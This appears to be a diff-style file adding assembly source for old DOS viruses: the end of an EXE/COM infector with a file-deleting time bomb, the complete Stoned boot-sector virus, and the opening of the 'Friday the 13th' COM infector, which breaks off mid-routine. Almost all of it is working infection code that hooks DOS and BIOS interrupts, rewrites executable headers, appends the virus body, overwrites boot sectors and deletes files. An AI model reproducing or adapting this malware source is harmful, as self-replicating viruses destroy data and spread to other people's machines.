+MOV  AX,CS:[000F]        ;<br>
+JMP  far CS:[000A]       ;<br>
+;<br>
+N21_40:  ADD  SP,+06         ;0298     ;<br>
+POPF                ;   (OUR PUSHF)<br>
+MOV  AX,CS               ;<br>
+MOV  SS,AX               ;<br>
+MOV  SP,710H             ;SIZE OF VIRUS CODE<br>
+PUSH ES             ;<br>
+PUSH ES             ;02A4     06<br>
+XOR  DI,DI               ;02A5     33FF<br>
+PUSH CS             ;02A7     0E<br>
+POP  ES             ;02A8     07<br>
+MOV  CX,0010             ;02A9     B91000<br>
+MOV  SI,BX               ;02AC     8BF3<br>
+MOV  DI,0021             ;02AE     BF2100<br>
+REP  MOVSB               ;02B2     A4<br>
+MOV  AX,DS               ;02B3     8CD8<br>
+MOV  ES,AX               ;02B5     8EC0<br>
+MUL  Word ptr CS:[A007A] ;02B7     2EF7267A00<br>
+ADD  AX,CS:[002B]        ;02BC     2E03062B00<br>
+ADC  DX,+00              ;02C1     83D200<br>
+DIV  Word ptr CS:[A007A] ;02C4     2EF7367A00<br>
+MOV  DS,AX               ;02C9     8ED8<br>
+MOV  SI,DX               ;02CB     8BF2<br>
+MOV  DI,DX               ;02CD     8BFA<br>
+MOV  BP,ES               ;02CF     8CC5<br>
+MOV  BX,CS:[002F]        ;02D1     2E8B1E2F00<br>
+OR   BX,BX               ;02D6     0BDB<br>
+JE   02ED           ;02D8     7413<br>
+MOV  CX,8000             ;02DA     B90080<br>
+REP  MOVSW               ;02DE     A5<br>
+ADD  AX,1000             ;02DF     050010<br>
+ADD  BP,1000             ;02E2     81C50010<br>
+MOV  DS,AX               ;02E6     8ED8<br>
+MOV  ES,BP               ;02E8     8EC5<br>
+DEC  BX             ;02EA     4B<br>
+JNE  02DA           ;02EB     75ED<br>
+MOV  CX,CS:[002D]        ;02ED     2E8B0E2D00<br>
+REP  MOVSB               ;02F3     A4<br>
+POP  AX             ;02F4     58<br>
+PUSH AX             ;02F5     50<br>
+ADD  AX,0010             ;02F6     051000<br>
+ADD  CS:[0029],AX        ;02F9     2E01062900<br>
+ADD  CS:[0025],AX        ;02FE     2E01062500<br>
+MOV  AX,CS:[0021]        ;0303     2EA12100<br>
+POP  DS             ;0307     1F<br>
+POP  ES             ;0308     07<br>
+MOV  SS,CS:[0029]        ;0309     2E8E162900<br>
+MOV  SP,CS:[0027]        ;030E     2E8B262700<br>
+JMP  far CS:[0023]       ;0313     2EFF2E2300<br>
+;<br>
+;---------------------------------------;<br>
+; IT IS TIME FOR THIS FILE TO DIE...   ;<br>
+; THIS IS WHERE IT GETS DELETED ! ;<br>
+;---------------------------------------;<br>
+N21_5A:  XOR  CX,CX               ;<br>
+MOV  AX,4301H       ;<br>
+INT  21H            ;CHANGE FILE MODE (ATT=0)<br>
+;<br>
+MOV  AH,41H              ;<br>
+INT  21H            ;DELETE A FILE<br>
+;<br>
+MOV  AX,4B00H       ;LOAD AND EXECUTE A PROGRAM<br>
+POPF                ;   (OUR PUSHF)<br>
+JMP  far CS:[OLD_21]          ;<br>
+;<br>
+;---------------------------------------;<br>
+; START INFECTION            ;<br>
+;---------------------------------------;<br>
+N21_50:  CMP  Byte ptr CS:[TIME_BOMB],1 ;032C ;IF TIME TO DIE...<br>
+JE   N21_5A              ;...JUMP<br>
+;<br>
+MOV  Word ptr CS:[HANDLE],-1  ;ASSUME NOT OPEN<br>
+MOV  Word ptr CS:[A008F],0    ;<br>
+MOV  word ptr CS:[HOST_NAME],DX   ;SAVE POINTER TO FILE NAME<br>
+MOV  word ptr CS:[HOST_NAME+2],DS ;<br>
+;<br>
+;INFECTION PROCESS OCCURS HERE    ;<br>
+PUSH AX             ;034C     50<br>
+PUSH BX             ;034D     53<br>
+PUSH CX             ;034E     51<br>
+PUSH DX             ;034F     52<br>
+PUSH SI             ;0350     56<br>
+PUSH DI             ;0351     57<br>
+PUSH DS             ;0352     1E<br>
+PUSH ES             ;0353     06<br>
+CLD                 ;0354     FC<br>
+MOV  DI,DX               ;0355     8BFA<br>
+XOR  DL,DL               ;0357     32D2<br>
+CMP  Byte ptr [DI+01],3A ;0359     807D013A<br>
+JNE  L0364               ;035D     7505<br>
+MOV  DL,[DI]             ;035F     8A15<br>
+AND  DL,1F               ;0361     80E21F<br>
+;<br>
+L0364:   MOV  AH,36               ;<br>
+INT  21H            ;GET DISK FREE SPACE<br>
+CMP  AX,-1               ;0368     3DFFFF<br>
+JNE  L0370               ;036B     7503<br>
+L036D:   JMP  I_90           ;036D     E97702<br>
+;<br>
+L0370:   MUL  BX             ;0370     F7E3<br>
+MUL  CX             ;0372     F7E1<br>
+OR   DX,DX               ;0374     0BD2<br>
+JNE  L037D               ;0376     7505<br>
+CMP  AX,710H             ;0378     3D1007<br>
+JC   L036D               ;037B     72F0<br>
+L037D:   MOV  DX,word ptr CS:[HOST_NAME]<br>
+PUSH DS             ;0382     1E<br>
+POP  ES             ;0383     07<br>
+XOR  AL,AL               ;0384     32C0<br>
+MOV  CX,41               ;0386     B94100<br>
+REPNE     SCASB               ;038A     AE<br>
+MOV  SI,word ptr CS:[HOST_NAME]<br>
+L0390:   MOV  AL,[SI]             ;0390     8A04<br>
+OR   AL,AL               ;0392     0AC0<br>
+JE   L03A4               ;0394     740E<br>
+CMP  AL,61               ;0396     3C61<br>
+JC   L03A1               ;0398     7207<br>
+CMP  AL,7A               ;039A     3C7A<br>
+JA   L03A1               ;039C     7703<br>
+SUB  Byte ptr [SI],20    ;039E     802C20<br>
+L03A1:   INC  SI             ;03A1     46<br>
+JMP  L0390               ;03A2     EBEC<br>
+;<br>
+L03A4:   MOV  CX,000B             ;03A4     B90B00<br>
+SUB  SI,CX               ;03A7     2BF1<br>
+MOV  DI,offset COMMAND_COM    ;03A9     BF8400<br>
+PUSH CS             ;03AC     0E<br>
+POP  ES             ;03AD     07<br>
+MOV  CX,000B             ;03AE     B90B00<br>
+REPE CMPSB               ;03B2     A6<br>
+JNE  L03B8               ;03B3     7503<br>
+JMP  I_90           ;03B5     E92F02<br>
+;<br>
+L03B8:   MOV  AX,4300H       ;<br>
+INT  21H            ;CHANGE FILE MODE<br>
+JC   L03C4               ;03BD     7205<br>
+;<br>
+MOV  CS:[HOST_ATT],CX    ;03BF     ;<br>
+L03C4:   JC   L03EB               ;03C4     7225<br>
+XOR  AL,AL               ;03C6     32C0<br>
+MOV  CS:[A004E],AL       ;03C8     2EA24E00<br>
+PUSH DS             ;03CC     1E<br>
+POP  ES             ;03CD     07<br>
+MOV  DI,DX               ;03CE     8BFA<br>
+MOV  CX,41               ;03D0     B94100<br>
+REPNZ     SCASB               ;03D4     AE<br>
+CMP  Byte ptr [DI-02],4D ;03D5     807DFE4D<br>
+JE   L03E6               ;03D9     740B<br>
+CMP  Byte ptr [DI-02],6D ;03DB     807DFE6D<br>
+JE   L03E6               ;03DF     7405<br>
+INC  Byte ptr CS:[A004E] ;03E1     2EFE064E00<br>
+;<br>
+L03E6:   MOV  AX,3D00H       ;<br>
+INT  21H            ;OPEN FILE READ ONLY<br>
+L03EB:   JC   L0447               ;<br>
+MOV  CS:[HANDLE],AX ;03ED     ;<br>
+;<br>
+MOV  BX,AX               ;MOVE TO END OF FILE -5<br>
+MOV  AX,4202             ;<br>
+MOV  CX,-1               ;FFFFFFFB<br>
+MOV  DX,-5               ;<br>
+INT  21H            ;MOVE FILE POINTER<br>
+JC   L03EB               ;<br>
+;<br>
+ADD  AX,5      ;0400     ;<br>
+MOV  CS:[A0011],AX       ;?SAVE HOST SIZE<br>
+;<br>
+MOV  CX,5      ;0407     ;READ LAST 5 BYTES OF HOST<br>
+MOV  DX,offset A006B          ;<br>
+MOV  AX,CS               ;<br>
+MOV  DS,AX               ;<br>
+MOV  ES,AX               ;<br>
+MOV  AH,3FH              ;<br>
+INT  21H            ;READ FROM A FILE<br>
+;<br>
+MOV  DI,DX          ;0417     ;CHECK IF LAST 5 BYTES = 'MsDos'<br>
+MOV  SI,offset MS_DOS    ;<br>
+REPE CMPSB               ;<br>
+JNE  L0427               ;<br>
+MOV  AH,3E               ;IF == 'MsDos'...<br>
+INT  21H            ;CLOSE FILE<br>
+JMP  I_90           ;...PASS CONTROL TO DOS<br>
+;<br>
+L0427:   MOV  AX,3524             ;GET CRITICAL ERROR VECTOR<br>
+INT  21H            ;GET VECTOR<br>
+MOV  [OLD_24],BX         ;<br>
+MOV  [OLD_24+2],ES       ;<br>
+;<br>
+MOV  DX,offset NEW_24    ;<br>
+MOV  AX,2524             ;SET CRITICAL ERROR VECTOR<br>
+INT  21H            ;SET VECTOR<br>
+;<br>
+LDS  DX,dword ptr [HOST_NAME];<br>
+XOR  CX,CX               ;<br>
+MOV  AX,4301H       ;<br>
+INT  21H            ;CHANGE FILE MODE<br>
+L0447:   JC   L0484               ;<br>
+;<br>
+MOV  BX,CS:[HANDLE]      ;<br>
+MOV  AH,3E               ;<br>
+INT  21H            ;CLOSE FILE<br>
+;<br>
+MOV  Word ptr CS:[HANDLE],-1  ;CLEAR HANDLE<br>
+;<br>
+MOV  AX,3D02             ;<br>
+INT  21H            ;OPEN FILE R/W<br>
+JC   L0484               ;<br>
+;<br>
+MOV  CS:[HANDLE],AX      ;0460     2EA37000<br>
+MOV  AX,CS               ;0464     8CC8<br>
+MOV  DS,AX               ;0466     8ED8<br>
+MOV  ES,AX               ;0468     8EC0<br>
+MOV  BX,[HANDLE]         ;046A     8B1E7000<br>
+MOV  AX,5700             ;046E     B80057<br>
+INT  21H            ;GET/SET FILE DATE TIME<br>
+;<br>
+MOV  [HOST_DATE],DX      ;0473     89167400<br>
+MOV  [HOST_TIME],CX      ;0477     890E7600<br>
+MOV  AX,4200             ;047B     B80042<br>
+XOR  CX,CX               ;047E     33C9<br>
+MOV  DX,CX               ;0480     8BD1<br>
+INT  21H            ;MOVE FILE POINTER<br>
+L0484:   JC   L04C3               ;0484     723D<br>
+;<br>
+CMP  Byte ptr [A004E],00 ;0486     803E4E0000<br>
+JE   L0490               ;048B     7403<br>
+JMP  L04E6               ;048D     EB57<br>
+;<br>
+NOP                 ;048F     90<br>
+L0490:   MOV  BX,1000             ;0490     BB0010<br>
+MOV  AH,48               ;0493     B448<br>
+INT  21H            ;ALLOCATE MEMORY<br>
+JNC  L04A4               ;0497     730B<br>
+;<br>
+MOV  AH,3E               ;0499     B43E<br>
+MOV  BX,[HANDLE]         ;049B     8B1E7000<br>
+INT  21H            ;CLOSE FILE (OBVIOUSLY)<br>
+JMP  I_90           ;04A1     E94301<br>
+;<br>
+L04A4:   INC  Word ptr [A008F]    ;04A4     FF068F00<br>
+MOV  ES,AX               ;04A8     8EC0<br>
+XOR  SI,SI               ;04AA     33F6<br>
+MOV  DI,SI               ;04AC     8BFE<br>
+MOV  CX,710H             ;04AE     B91007<br>
+REP  MOVSB               ;04B2     A4<br>
+MOV  DX,DI               ;04B3     8BD7<br>
+MOV  CX,[A0011]          ;?GET HOST SIZE - YES<br>
+MOV  BX,[70H]       ;04B9     8B1E7000<br>
+PUSH ES             ;04BD     06<br>
+POP  DS             ;04BE     1F<br>
+MOV  AH,3FH              ;04BF     B43F<br>
+INT  21H            ;READ FROM A FILE<br>
+L04C3:   JC   L04E1               ;04C3     721C<br>
+;<br>
+ADD  DI,CX               ;04C5     03F9<br>
+;<br>
+XOR  CX,CX               ;POINT TO BEGINNING OF FILE<br>
+MOV  DX,CX               ;<br>
+MOV  AX,4200H       ;<br>
+INT  21H            ;MOVE FILE POINTER<br>
+;<br>
+MOV  SI,offset MS_DOS    ;04D0     BE0500<br>
+MOV  CX,5           ;04D3     B90500<br>
+REP  CS:MOVSB       ;04D7     2EA4<br>
+MOV  CX,DI               ;04D9     8BCF<br>
+XOR  DX,DX               ;04DB     33D2<br>
+MOV  AH,40H              ;<br>
+INT  21H            ;WRITE TO A FILE<br>
+L04E1:   JC   L04F0               ;<br>
+JMP  L05A2               ;<br>
+;<br>
+;---------------------------------------;<br>
+; READ EXE HEADER            ;<br>
+;---------------------------------------;<br>
+L04E6:   MOV  CX,1CH              ;READ EXE HEADER INTO BUFFER<br>
+MOV  DX,offset EXE_HDR   ;<br>
+MOV  AH,3F               ;<br>
+INT  21H            ;READ FILE<br>
+JC   L053C               ;<br>
+;<br>
+;---------------------------------------;<br>
+; TWEEK EXE HEADER TO INFECTED HSOT    ;<br>
+;---------------------------------------;<br>
+MOV  Word ptr [EXE_HDR+18],1984H ;SAVE HOST'S EXE HEADER INFO<br>
+MOV  AX,[EXE_HDR+14]          ;   SS<br>
+MOV  [HOST_SS],AX        ;<br>
+MOV  AX,[EXE_HDR+16]          ;   SP<br>
+MOV  [HOST_SP],AX        ;<br>
+MOV  AX,[EXE_HDR+20]          ;   IP<br>
+MOV  [HOST_IP],AX        ;<br>
+MOV  AX,[EXE_HDR+22]          ;   CS<br>
+MOV  [HOST_CS],AX        ;<br>
+MOV  AX,[EXE_HDR+4]      ;   SIZE (IN 512 BLOCKS)<br>
+CMP  Word ptr [EXE_HDR+2],0   ;   SIZE MOD 512<br>
+JZ   L051B               ;IF FILE SIZE==0...JMP<br>
+DEC  AX             ;<br>
+L051B:   MUL  Word ptr [BLOCK_SIZE]    ;<br>
+ADD  AX,[EXE_HDR+2]      ;<br>
+ADC  DX,0           ;AX NOW = FILE SIZE<br>
+;<br>
+ADD  AX,0FH              ;MAKE SURE FILE SIZE IS PARA. BOUND<br>
+ADC  DX,0           ;<br>
+AND  AX,0FFF0H      ;<br>
+MOV  [HOST_SIZE],AX      ;SAVE POINTER TO BEGINNING OF VIRUS<br>
+MOV  [HOST_SIZE+2],DX    ;<br>
+;<br>
+ADD  AX,710H             ;(SIZE OF VIRUS)<br>
+ADC  DX,0           ;<br>
+L053C:   JC   L0578               ;IF &gt; FFFFFFFF...JMP<br>
+DIV  Word ptr [BLOCK_SIZE]    ;<br>
+OR   DX,DX               ;<br>
+JE   L0547               ;<br>
+INC  AX             ;<br>
+L0547:   MOV  [EXE_HDR+4],AX      ;<br>
+MOV  [EXE_HDR+2],DX      ;<br>
+;---------------;<br>
+MOV  AX,[HOST_SIZE]                ;DX:AX = HOST SIZE<br>
+MOV  DX,[HOST_SIZE+2]              ;<br>
+DIV  Word ptr [A007A]              ;<br>
+SUB  AX,[EXE_HEAD+8]                    ;SIZE OF EXE HDR<br>
+MOV  [EXE_HDR+22],AX                    ;VALUE OF CS<br>
+MOV  Word ptr [EXE_HDR+20],offset BEGIN_EXE  ;VALUE OF IP<br>
+MOV  [EXE_HDR+14],AX                    ;VALUE OF SS<br>
+MOV  Word ptr [EXE_HDR+16],710H         ;VALUE OF SP<br>
+;---------------;<br>
+XOR  CX,CX               ;POINT TO BEGINNING OF FILE (EXE HDR)<br>
+MOV  DX,CX               ;<br>
+MOV  AX,4200H       ;<br>
+INT  21H            ;MOVE FILE POINTER<br>
+L0578:   JC   L0584               ;<br>
+;<br>
+;---------------------------------------;<br>
+; WRITE INFECTED EXE HEADER       ;<br>
+;---------------------------------------;<br>
+MOV  CX,1CH              ;<br>
+MOV  DX,offset EXE_HDR   ;<br>
+MOV  AH,40H              ;<br>
+INT  21H            ;WRITE TO A FILE<br>
+L0584:   JC   L0597               ;<br>
+CMP  AX,CX               ;<br>
+JNE  L05A2               ;<br>
+;<br>
+MOV  DX,[HOST_SIZE]      ;POINT TO END OF FILE<br>
+MOV  CX,[HOST_SIZE+2]    ;<br>
+MOV  AX,4200             ;<br>
+INT  21H            ;MOVE FILE POINTER<br>
+L0597:   JC   L05A2               ;<br>
+;<br>
+;---------------------------------------;<br>
+; WRITE VIRUS CODE TO END OF HOST ;<br>
+;---------------------------------------;<br>
+XOR  DX,DX               ;<br>
+MOV  CX,710H             ;(SIZE OF VIRUS)<br>
+MOV  AH,40H              ;<br>
+INT  21H            ;WRITE TO A FILE<br>
+;<br>
+L05A2:   CMP  Word ptr CS:[008F],0     ;IF...<br>
+JZ   L05AE               ;...SKIP<br>
+MOV  AH,49H              ;<br>
+INT  21H            ;FREE ALLOCATED MEMORY<br>
+;<br>
+L05AE:   CMP  Word ptr CS:[HANDLE],-1  ;IF ...<br>
+JE   I_90           ;...SKIP<br>
+;<br>
+MOV  BX,CS:[HANDLE]      ;RESTORE HOST'S DATE/TIME<br>
+MOV  DX,CS:[HOST_DATE]   ;<br>
+MOV  CX,CS:[HOST_TIME]   ;<br>
+MOV  AX,5701H       ;<br>
+INT  21H            ;GET/SET FILE DATE/TIME<br>
+;<br>
+MOV  AH,3EH              ;<br>
+INT  21H            ;CLOSE FILE<br>
+;<br>
+LDS  DX,CS:[HOST_NAME]   ;RESTORE HOST'S ATTRIBUTE<br>
+MOV  CX,CS:[HOST_ATT]    ;<br>
+MOV  AX,4301H       ;<br>
+INT  21H            ;CHANGE FILE MODE<br>
+;<br>
+LDS  DX,dword ptr CS:[OLD_24];RESTORE CRITICAL ERROR HANDLER<br>
+MOV  AX,2524H       ;<br>
+INT  21H            ;SET VECTOR<br>
+;<br>
+I_90:    POP  ES             ;<br>
+POP  DS             ;<br>
+POP  DI             ;<br>
+POP  SI             ;<br>
+POP  DX             ;<br>
+POP  CX             ;<br>
+POP  BX             ;<br>
+POP  AX             ;<br>
+POPF                ;   (OUR PUSHF)<br>
+JMP  far CS:[OLD_21]          ;PASS CONTROL TO DOS<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------<br>
+<br>
+************************************************************************<br>
+------------------------------------------------------------------------<br>
+------------------------------------------------------------------------<br>
+************************************************************************<br>
+<br>
+The "New Zealand Virus".<br>
+Also called - Stoned, Marijuana, San Diego Virus, Smithsonian Virus<br>
+<br>
+CODE  SEGMENT<br>
+<br>
+ASSUME   CS:CODE<br>
+<br>
+WORK_SPACE         EQU   512<br>
+MAXIMUM_SIZE   EQU   1BEH<br>
+<br>
+VIRUS PROC  NEAR<br>
+<br>
+DB    0EAH     ;JMP   07C0:0005<br>
+DW    5,7C0H<br>
+JMP   INSTALL<br>
+<br>
+;  DRIVE_LETTER INDICATES BOOT DISK,  0 = A:, 2 = C:<br>
+<br>
+DRIVE_LETTER        DB   0<br>
+<br>
+OLD_13  LABEL DWORD<br>
+OFFS           DW   ?<br>
+SEGM           DW   ?<br>
+<br>
+NEW_ADDRESS LABEL DWORD<br>
+DW   CONTINUE<br>
+NEW_SEGMENT DW   0<br>
+<br>
+REBOOT    LABEL DWORD<br>
+DW   7C00H,0<br>
+<br>
+NEW_13:<br>
+PUSH  DS<br>
+PUSH  AX<br>
+CMP   AH,2             <br>
+JC    SPINNING         <br>
+CMP   AH,4<br>
+JNC   SPINNING         <br>
+OR    DL,DL             ; IS IT DRIVE A:?<br>
+JNZ   SPINNING          ; JUMP IF NOT<br>
+XOR   AX,AX<br>
+MOV   DS,AX             <br>
+MOV   AL,DS:43FH        ; IS DRIVE MOTOR SPINNING?<br>
+TEST  AL,1              ; IF YES THEN JUMP<br>
+JNZ   SPINNING<br>
+<br>
+; INT13 REQUEST IS FOR READ OR WRITE TO A: - MOTOR NOT YET STARTED.<br>
+<br>
+CALL  INFECT            ; NOT SPINNING - INFECT<br>
+SPINNING:<br>
+POP   AX<br>
+POP   DS<br>
+JMP   CS:[OLD_13]     <br>
+<br>
+INFECT:<br>
+PUSH  BX                ; SAVE REGISTERS<br>
+PUSH  CX<br>
+PUSH  DX<br>
+PUSH  ES<br>
+PUSH  SI<br>
+PUSH  DI<br>
+MOV   SI,4              ; MAKE FOUR ATTEMPTS<br>
+GET_BOOT_SECTOR:<br>
+MOV   AX,201H           ; READ SECTOR<br>
+PUSH  CS                <br>
+POP   ES                <br>
+MOV   BX,OFFSET WORK_SPACE<br>
+XOR   CX,CX             ; TRACK 0, SECTOR 0<br>
+MOV   DX,CX             ; HEAD 0, DRIVE 0<br>
+INC   CX                <br>
+PUSHF                   <br>
+CALL  CS:[OLD_13]<br>
+JNC   BOOT_IS_DONE      ; READ OK.<br>
+XOR   AX,AX             ; DRIVE RESET<br>
+PUSHF<br>
+CALL  CS:[OLD_13]<br>
+DEC   SI                ; COUNT NUMBER OF TRIES<br>
+JNZ   GET_BOOT_SECTOR   ; LOOP<br>
+JMP   FINISH        <br>
+BOOT_IS_DONE:<br>
+XOR   SI,SI             ; CODE SEGMENT START <br>
+MOV   DI,OFFSET WORK_SPACE  ; POINTER TO BOOT SECTOR<br>
+CLD                     <br>
+PUSH  CS      <br>
+POP   DS                <br>
+LODSW                   <br>
+CMP   AX,DS:[DI]        ; OURS?<br>
+JNZ   CREATE_BOOT       ; NO, CREATE BOOT<br>
+LODSW                   ; RETRY<br>
+CMP   AX,DS:[DI+2]      ; OURS?<br>
+JZ    FINISH            ; NO, FINISH UP<br>
+CREATE_BOOT:<br>
+MOV   AX,301H           ; WRITE ORIGINAL BOOT SECTOR FROM BUFFER<br>
+MOV   BX,OFFSET WORK_SPACE  <br>
+MOV   CL,3              <br>
+MOV   DH,1              <br>
+<br>
+PUSHF<br>
+CALL  CS:[OLD_13]     ; WRITE <br>
+JC    FINISH        <br>
+MOV   AX,301H         <br>
+XOR   BX,BX           <br>
+MOV   CL,01           <br>
+XOR   DX,DX           <br>
+PUSHF<br>
+CALL  CS:[OLD_13]     <br>
+FINISH:<br>
+POP   DI                ; RESTORE REGISTERS<br>
+POP   SI<br>
+POP   ES<br>
+POP   DX<br>
+POP   CX<br>
+POP   BX<br>
+RET<br>
+<br>
+INSTALL:<br>
+XOR   AX,AX<br>
+MOV   DS,AX<br>
+CLI<br>
+MOV   SS,AX<br>
+MOV   SP,7C00H        <br>
+STI                     ; ENABLE INTERRUPTS<br>
+MOV   AX,DS:4CH         ; SAVE OLD 13H <br>
+MOV   DS:[OFFS+7C00H],AX<br>
+MOV   AX,DS:4EH<br>
+MOV   DS:[SEGM+7C00H],AX<br>
+MOV   AX,DS:413H        ; MEMORY AVAILABLE <br>
+DEC   AX                <br>
+DEC   AX                <br>
+MOV   DS:413H,AX        <br>
+MOV   CL,6 <br>
+SHL   AX,CL<br>
+MOV   ES,AX                          ; ES: = FREE MEMORY ADDRESS<br>
+MOV   DS:[NEW_SEGMENT+7C00H],AX   ; PUT IT INTO NEW JUMP VECTOR<br>
+<br>
+MOV   AX,OFFSET NEW_13             ; INSTALL NEW VIRUS VECTOR<br>
+MOV   DS:4CH,AX<br>
+MOV   DS:4EH,ES<br>
+<br>
+MOV   CX,OFFSET ENDOFPROGMEM<br>
+PUSH  CS<br>
+POP   DS                ; DS POINTS TO OUR CODE SEGMENT<br>
+XOR   SI,SI             ; SI POINTS TO 0<br>
+MOV   DI,SI             ; DI POINTS TO 0<br>
+CLD                     ; SET DIRECTION FLAG TO INCREMENT<br>
+REP   MOVSB             ; MOVE OURSELVES INTO HIGH MEMORY!<br>
+JMP   NEW_ADDRESS    ; THIS JUMP TRANSFERS TO CONTINUE BUT IN HIGH MEM<br>
+<br>
+; THE FOLLOWING CODE IS EXECUTED AFTER BEING MOVED TO HIGH MEMORY<br>
+; EXECUTION IS VIA THE JUMP TO NEW_ADDRESS<br>
+<br>
+CONTINUE:<br>
+MOV   AX,0              ; RESET DISK SYSTEM<br>
+INT   13H               ; THIS IS THE INFECTED INT 13H<br>
+<br>
+XOR   AX,AX             ; READ REAL BOOT SECTOR<br>
+MOV   ES,AX<br>
+MOV   AX,201H<br>
+MOV   BX,7C00H          ; INTO THE BOOT AREA OF RAM<br>
+CMP   DRIVE_LETTER,0<br>
+JZ    BOOT_A<br>
+BOOT_C:<br>
+MOV   CX,0002H          ; FROM SECTOR 2 TRACK 0  HEAD 0 FOR FIRST HD<br>
+MOV   DX,0080H<br>
+INT   13H<br>
+JMP   QUITPROG<br>
+BOOT_A:<br>
+MOV   CX,0003H          ; FROM SECTOR 3 TRACK 0 HEAD 1 FOR DRIVE A:<br>
+MOV   DX,0100H<br>
+INT   13H<br>
+JC    QUITPROG          ; FAILED READ!<br>
+<br>
+TEST  BYTE PTR ES:46CH,7   ; CHECK SYSTEM CLOCK LAST 3 BITS<br>
+JNZ   NOMESSAGE<br>
+MOV   SI,OFFSET MESSAGE    ; DS IS POINTING TO 7C0:000 WHICH<br>
+PUSH  CS<br>
+POP   DS<br>
+MSGLOOP:<br>
+LODSB                   ; ALSO HAS THE TEXT<br>
+OR    AL,AL<br>
+JZ    NOMESSAGE<br>
+MOV   AH,14<br>
+MOV   BH,0<br>
+INT   10H<br>
+JMP   MSGLOOP<br>
+<br>
+NOMESSAGE:<br>
+PUSH  CS<br>
+POP   ES<br>
+MOV   AX,201H<br>
+MOV   BX,OFFSET WORK_SPACE  ; READ BOOT SECTOR FROM HARD DISK<br>
+MOV   CL,1    <br>
+MOV   DX,0080H<br>
+INT   13H<br>
+JC    QUITPROG          ; BAD READ - SO JUMP<br>
+PUSH  CS<br>
+POP   DS<br>
+MOV   SI,OFFSET WORK_SPACE  ; SOURCE IS THE BOOT SECTOR<br>
+MOV   DI,0              ; DESTINATION IS OUR OWN CODE<br>
+LODSW                   ; MOV  AX,DS:[SI]<br>
+; ADD  SI,2<br>
+CMP   AX,DS:[DI]        ; VIRUS?<br>
+JNZ   SAVEBOOT          ; JUMP IF NOT<br>
+LODSW                   ; MOV  AX,DS:[SI]<br>
+; ADD  SI,2<br>
+CMP   AX,DS:[DI+2]      ; HAS IT GOT A VIRUS?<br>
+JNZ   SAVEBOOT<br>
+QUITPROG:<br>
+MOV   DRIVE_LETTER,0         ; YES - SO BOOT DRIVE 0 FOR A&gt;<br>
+JMP   REBOOT            ; THIS JUMPS TO 0:7C00H TO CONTINUE BOOT CODE<br>
+<br>
+SAVEBOOT:<br>
+MOV   DRIVE_LETTER,2         ; DRIVE 2 FOR C&gt;<br>
+MOV   AX,301H           ; GONNA WRITE<br>
+MOV   BX,OFFSET WORK_SPACE  ; OLD BOOT SECTOR<br>
+MOV   CX,0007H          ; TO SECTOR 7<br>
+MOV   DX,0080H          ;       OF DRIVE C&gt;<br>
+INT   13H<br>
+JC    QUITPROG<br>
+PUSH  CS<br>
+POP   DS<br>
+PUSH  CS<br>
+POP   ES<br>
+MOV   SI,OFFSET WORK_SPACE+MAXIMUM_SIZE<br>
+MOV   DI,MAXIMUM_SIZE<br>
+MOV   CX,400H-MAXIMUM_SIZE<br>
+REP   MOVSB             ; SI -&gt; DI AND INC BOTH    CX TIMES<br>
+MOV   AX,301H           ; GONNA WRITE BOOT SECTOR<br>
+XOR   BX,BX             ; FROM TOP OF OUR CODE<br>
+INC   CL                ; SECTOR 1<br>
+;  MOV   DX,0080H          ;&lt;-- DX IS LEFT OVER FROM ABOVE<br>
+INT   13H               ; DO IT<br>
+JMP   QUITPROG<br>
+<br>
+MESSAGE:<br>
+DB 7,'Your PC is now Stoned!',7,13,10,10,0<br>
+DB 'LEGALISE MARIJUANA!'    ; This bit doesn't display!<br>
+ENDOFPROGMEM:<br>
+<br>
+VIRUS ENDP<br>
+<br>
+CODE  ENDS<br>
+END   VIRUS<br>
+<br>
+*****************************************************************<br>
+-----------------------------------------------------------------<br>
+-----------------------------------------------------------------<br>
+*****************************************************************<br>
+<br>
+The original 'Friday the 13th"<br>
+Also called - Munich Virus, Miami Virus<br>
+<br>
+<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+; THE METHOD OF INFECTION:                           ;<br>
+; SAVE FIRST 3 BYTES OF HOST TO SAVE AREA INSIDE OF VIRIUL SHELL     ;<br>
+; APPEND VIRIUL SHELL TO END OF .COM FILE (ON A PARAGRAPH BOUNDARY!) ;<br>
+;-----------------------------------------------------------------------;<br>
+; ATTENTION!                                     ;<br>
+; RESULTING FILE APPARENTLY MUST BE &lt; 64K                            ;<br>
+; REMEMBER THE STACK IS AT THE TOP OF THE 64K FILE! WHERE SHELL RESIDES   ;<br>
+; STACK MUST HAVE ROOM FOR VIRUS USE                       ;<br>
+;-----------------------------------------------------------------------;<br>
+CODE     SEGMENT PUBLIC 'CODE'         ;<br>
+ASSUME    CS:CODE,DS:CODE,ES:CODE,SS:CODE<br>
+;<br>
+ORG  100H           ;SAME A .COM FILE FOR NOW<br>
+;<br>
+PUBLIC    HOST_SIZE      ;;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; JUMP AROUND VIRUS DATA AREA                              ;<br>
+;-----------------------------------------------------------------------;<br>
+BEGIN:   JMP  CONTINUE       ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; SHELL DATA AREA APPARENTLY FOLLOWS                            ;<br>
+;-----------------------------------------------------------------------;<br>
+HOST_3        DB   ?,?,?          ;FIRST 3 BYTES OF HOST<br>
+ID       DB   'INFECTED',0   ;FYI ALREADY INFECTED ID<br>
+;<br>
+NEW_3         DB   0E9H      ;TO REPLACE FIRST 3 BYTES OF HOST<br>
+OUR_BEGIN     DW   ?         ;<br>
+;<br>
+HOST_TYPE     DB   '*.COM',0 ;TYPE OF FILES TO INFECT<br>
+;<br>
+DTA      DB   21 DUP (?)     ;USED BY DOS<br>
+DB   ?         ;FILE ATTRIBUTE<br>
+DW   ?         ;FILES TIME<br>
+DW   ?         ;FILES DATE<br>
+HOST_SIZE     DW   ?         ;FILE SIZE<br>
+DW   ?         ;FILE SIZE<br>
+HOST_NAME     DB   13 DUP (?)     ;FILE NAME<br>
+;<br>
+COMMAND_COM   DB   'COMMAND.COM',0     ;<br>
+COMMAND_LENGTH     EQU  $ - offset COMMAND_COM<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; SAVE INCOMMING ENVIRONMENT AND SETUP WORKING ENVIRONMENT      ;<br>
+;-----------------------------------------------------------------------;<br>
+CONTINUE:                    ;<br>
+PUSH CS             ;SAVE HOST SEGMENT<br>
+PUSH AX             ;SAVE SPACE FOR HOST offset<br>
+;<br>
+PUSH AX             ;SAVE INCOMMING REGs<br>
+PUSH BX             ;<br>
